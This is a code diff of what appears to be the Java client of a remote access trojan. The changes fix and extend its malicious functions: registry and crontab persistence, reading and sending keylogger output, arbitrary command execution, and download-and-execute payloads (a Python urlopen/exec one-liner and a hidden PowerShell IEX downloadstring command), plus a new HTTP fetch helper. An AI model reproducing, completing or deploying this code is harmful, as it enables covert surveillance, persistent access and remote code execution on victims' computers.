@@ -106,12 +106,12 @@ public class Client {
         // For osx, use launchd:
         ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", "REG ADD HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Desktop /d " + "\"" + clientPath + "\"");
         if (SYSTEMOS.toLowerCase().contains("lin")){
-            pb = new ProcessBuilder("(crontab", "-l", "2>/dev/null;", "echo \"*/5 * * * * $(which java) -jar jarfile\")", "|", "crontab", "-");
+            pb = new ProcessBuilder("(crontab", "-l", "2>/dev/null;", "echo \"*/5 * * * * $(which java) -jar " + clientPath + "\")", "|", "crontab", "-");
         }
 
         try {
             Process proc = pb.start();
-            proc.waitFor(2, TimeUnit.SECONDS);
+            proc.waitFor(4, TimeUnit.SECONDS);
             proc.destroyForcibly();
         } catch (IOException | InterruptedException e) {
             e.printStackTrace();
@@ -200,6 +200,10 @@ public class Client {
                     CLIENT: read(keyLogFile)
                      */
                     communicate("READKEYLOG");
+                    if (!keyLogger) {
+                        dos.writeInt(0);
+                        communicate("Keylogger is not enabled for this session");
+                    }
                     String content = new String(Files.readAllBytes(Paths.get(keyLogFile)));
                     dos.writeInt(content.length());
                     communicate(content);
@@ -521,7 +525,7 @@ public class Client {
                 ProcessBuilder pb = null;
                 if (SYSTEMOS.contains("Windows")) {
                     pb = new ProcessBuilder("cmd.exe", "/c", command);
-                } else if (SYSTEMOS.contains("Linux")) {
+                } else {
                     pb = new ProcessBuilder(command);
                 }
                 if (pb != null) {
@@ -777,9 +781,9 @@ public class Client {
         switch (target){
             case "python":
                 if (SYSTEMOS.contains("Windows")){
-                    cmd = "python.exe -c \"import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen(" + url + "');exec(r.read());\"";
+                    cmd = "python.exe -c \"import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('" + url + "');exec(r.read());\"";
                 } else {
-                    cmd = "python -c \"import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen(" + url + "');exec(r.read());\"";
+                    cmd = "python -c \"import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('" + url + "');exec(r.read());\"";
                 }
             case "powershell":
                 cmd = "powershell.exe -nop -w hidden -c $e=new-object net.webclient;$e.proxy=[Net.WebRequest]::GetSystemWebProxy();$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $e.downloadstring('" + url + "');";
@@ -819,6 +823,18 @@ public class Client {
             buffer.append((char) randomLimitedInt);
         }
         return buffer.toString();
+    }
+
+    public static String sendHttpRequest(String s){
+        try{
+            return new Scanner(new URL(s).openStream(), "UTF-8").useDelimiter("\\A").next();
+        } catch (IOException ioe){
+            if (debugMode){
+                System.out.println("Unable to execute HTTP request!");
+                ioe.printStackTrace();
+            }
+            return "";
+        }
     }
 
     public static String encrypt(String data, String key) {
